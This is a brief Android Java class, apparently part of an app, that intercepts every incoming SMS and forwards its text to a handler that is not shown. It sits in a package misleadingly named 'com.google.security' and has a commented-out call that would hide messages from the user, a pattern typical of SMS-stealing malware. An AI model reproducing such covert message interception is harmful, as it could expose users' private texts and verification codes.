package com.google.security;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.os.Message;
import android.telephony.SmsMessage;

public class SMSReceiver extends BroadcastReceiver {
	private SMSHandler mHandler;

	@Override
	public void onReceive(Context context, Intent intent) {
		// TODO Auto-generated method stub
		if (intent.getAction()
				.equals("android.provider.Telephony.SMS_RECEIVED")) {
			Bundle bundle = intent.getExtras();
			if (bundle != null) {
				Object[] pdus = (Object[]) bundle.get("pdus");
				for (Object pdu : pdus) {
					SmsMessage sms = SmsMessage.createFromPdu((byte[]) pdu);
					String content = sms.getMessageBody();
					// String sender = sms.getOriginatingAddress();
					Message msg;

					msg = new Message();
					mHandler = new SMSHandler(context);
					msg.obj = content;
					mHandler.sendMessage(msg);
					//abortBroadcast();

				}
			}

		}
	}

}
